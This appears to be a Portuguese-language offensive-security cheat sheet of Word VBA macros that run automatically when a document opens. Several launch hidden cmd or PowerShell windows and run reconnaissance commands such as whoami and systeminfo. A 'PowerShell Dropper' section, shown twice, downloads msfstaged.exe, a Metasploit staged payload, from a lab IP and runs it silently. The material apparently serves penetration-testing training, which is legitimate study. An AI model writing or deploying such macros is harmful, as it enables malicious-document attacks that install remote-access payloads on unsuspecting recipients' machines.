# Word VBA Macro

## Exibir alerta na tela
```
Sub Document_Open()
    RedScan
End Sub
Sub AutoOpen()
    RedScan
End Sub
Sub RedScan()
    MsgBox ("RedScan Academy")
End Sub
```

## Abrir arquivo
```
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim str As String
    str = "calc.exe"
    Shell str, vbHide
End Sub
```

## Abrir o CMD
```
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    CreateObject("Wscript.Shell").Run str, 0
End Sub
```

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

## Executa um comando com saída na msgbox
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim objShell As Object
    Dim objExec As Object
    Dim strOutput As String
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c whoami")
    
    strOutput = objExec.StdOut.ReadAll
    
    MsgBox "Usuário atual: " & strOutput
End Sub
```

## PowerShell Dropper
```
Sub Document_Open()
    MyMacro
End Sub
Sub AutoOpen()
    MyMacro
End Sub
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide
End Sub
Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')"
    Shell str, vbHide
    Dim exePath As String
    exePath = ActiveDocument.Path & "\" & "msfstaged.exe"
    Wait (2)
    Shell exePath, vbHide

End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub
```

## Executa um comando com saída na msgbox
```
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim objShell As Object
    Dim objExec As Object
    Dim strOutput As String
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c whoami")
    
    strOutput = objExec.StdOut.ReadAll
    
    MsgBox "Usuário atual: " & strOutput
End Sub
```

## Executar comando e salvar resposta em arquivo de texto
```
Sub MyMacro()
    Dim objShell As Object, objExec As Object, strLine As String
    Dim fso As Object, txtFile As Object
    
    Set objShell = CreateObject("WScript.Shell")
    Set objExec = objShell.Exec("cmd /c systeminfo")
    
    Set fso = CreateObject("Scripting.FileSystemObject")
    Set txtFile = fso.CreateTextFile("C:\Temp\systeminfo.txt", True)
    
    Do Until objExec.StdOut.AtEndOfStream
        strLine = objExec.StdOut.ReadLine
        txtFile.WriteLine strLine
    Loop
    
    txtFile.Close
    MsgBox "Arquivo salvo em C:\Temp\systeminfo.txt"
End Sub
```

## CMD
```
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "cmd"
End Sub
```

## PowerShell
```
Sub AutoOpen()
  MyMacro
End Sub
Sub Document_Open()
  MyMacro
End Sub
Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```















